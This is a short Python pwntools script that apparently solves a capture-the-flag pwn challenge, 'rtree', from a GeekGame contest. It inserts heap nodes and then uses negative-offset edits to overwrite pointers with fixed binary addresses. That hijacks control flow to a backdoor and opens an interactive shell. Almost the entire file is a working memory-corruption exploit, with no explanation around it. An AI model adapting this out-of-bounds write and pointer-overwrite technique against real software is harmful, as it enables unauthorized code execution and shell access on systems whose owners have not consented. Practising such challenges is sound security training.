import pwn
import time

pwn.context.log_level = 'debug'
# r = pwn.remote('prob13.geekgame.pku.edu.cn', 10013)
r = pwn.process('./rtree')

# r.recvuntil(b'Please input your token:')
# r.sendline(b'<token>')

def insert(key: int, size: int = 16, data: bytes = b'/bin/sh\x00/bin/sh\x00'):
	assert len(data) == size
	r.recvuntil(b'4. quit')
	r.sendline(b'1')

	r.recvuntil(b'please enter the node key:')
	r.sendline(str(key).encode())

	r.recvuntil(b'please enter the size of the data:')
	r.sendline(str(size).encode())

	r.recvuntil(b'please enter the data:')
	r.sendline(data)

def modify(key: int, offset: int, newdata: bytes):
	r.recvuntil(b'4. quit')
	r.sendline(b'3')

	r.recvuntil(b'please enter the key of the node you want to edit:')
	r.sendline(str(key).encode())

	r.recvuntil(b'please enter the index of the data you want to edit:')
	r.sendline(str(offset).encode())

	r.recvuntil(b'please enter the new data:')
	r.sendline(newdata)


o = [-48 - 80*delta for delta in range(0, 10)]

insert(0)
insert(0)
insert(1002)
insert(1003)
modify(1002, o[2] + 0x18, b'\xed\x16\x40\x00\x00\x00\x00\x00')
modify(1003, o[2] + 0x18, b'\x9c\x12\x40\x00\x00\x00\x00\x00')

r.recvuntil(b'4. quit')
r.sendline(b'3')
r.recvuntil(b'please enter the key of the node you want to edit:')
r.sendline(b'0')
r.interactive()




# + b'\x00\x01\x00\x00\x00\x00\x00\x00' + 

# r.recvuntil(b'congratulations! you reach the backdoor!')
# # r.sendline(b'whoami')
# # print(r.recvall().decode())
# # print(r.recvall().decode())

# r.interactive()
